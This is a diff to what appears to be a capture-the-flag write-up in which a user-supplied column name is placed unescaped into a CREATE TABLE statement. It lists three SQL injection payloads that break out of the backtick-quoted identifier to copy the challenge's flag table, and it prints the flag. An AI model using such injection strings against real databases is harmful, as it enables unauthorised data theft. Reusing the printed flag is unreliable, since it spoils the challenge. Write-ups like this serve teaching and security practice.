@@ -18,9 +18,9 @@ CREATE TABLE `cloudtable`.`{new table name}`(`{USER INPUT}` TYPE);
 
 My approach was just to use one of the techniques to clone tables with additional fields. Here are a few working attacks that copy the flag table into the new table:
 
-> hi\` TEXT) AS SELECT * FROM cloudtable.flag;#
-> hi\` TEXT) TABLE cloudtable.flag;#
-> hi\` TEXT) SELECT * FROM cloudtable.flag;#
+- hi\` TEXT) AS SELECT * FROM cloudtable.flag;#
+- hi\` TEXT) TABLE cloudtable.flag;#
+- hi\` TEXT) SELECT * FROM cloudtable.flag;#
 
 Flag: `we{1cf8b0f2-7659-4277-b1be-8b50b1d1e046@Sq1_Injection_By_Cr3ate}`
 
